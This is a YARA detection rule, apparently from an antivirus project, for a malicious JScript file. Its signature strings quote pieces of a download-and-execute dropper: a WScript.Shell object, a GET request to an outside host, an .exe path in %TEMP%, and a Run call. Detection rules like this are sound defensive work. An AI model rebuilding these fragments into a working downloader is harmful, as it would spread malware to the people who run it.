rule sig_20160401_15d62aae08cc01332d5c2d3ced9c245a {
  meta:
    description = "datamaliciousorder - file 20160401_15d62aae08cc01332d5c2d3ced9c245a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "08a631feaffd6b7c8f842f2a1059d0bf5e9bde91a077bf390e0e53149f07a5a1"

  strings:
    $s1  = "var DpBu = function YqOdn() {return WScript[MwChy](\"WScript\"+\".Shell\");}(), EwWo = 11;" fullword ascii
    $s2  = "function NlAgv(TioXib, OtKvj){GkzFp = GkzFp * 1; return TioXib - OtKvj;};" fullword ascii
    $s3  = "EcVz[SrFk](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (EcVz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XbAfv(){return MsAuy + \"\";};" fullword ascii
    $s6  = "function CnMwb() {return DpBu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"J5Lujeu8UXDfJLm.ex\" + \"e\";};" fullword ascii
    $s7  = "function UhnVh() {return ((MtsXnv == true) && (MtsXnv == BzQkh)) ? 1 : GkzFp;};" fullword ascii
    $s8  = "BzQkh = true; " fullword ascii
    $s9  = "function UetJan(EicVu){DpBu[\"R\"+\"un\"](EicVu, GkzFp, GkzFp);};" fullword ascii
    $s10 = "function VwKjx(){return MwChy;};" fullword ascii
    $s11 = "function FelKi(){return 23;};" fullword ascii
    $s12 = "MtsXnv = true; " fullword ascii
    $s13 = "var MtsXnv = false;" fullword ascii
    $s14 = "var GaGqs = false;" fullword ascii
    $s15 = "function HszCzu(VaxVvj) {var JsqMb = (1, 2, 3, 4, 5, VaxVvj); return JsqMb;};" fullword ascii
    $s16 = "return NlAgv(WbyGz, IsnRlw);" fullword ascii
    $s17 = "var BzQkh = false;" fullword ascii
    $s18 = "function OwOq()" fullword ascii
    $s19 = "var LtRve = new this[\"Date\"]();" fullword ascii
    $s20 = "}while (GcaPj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}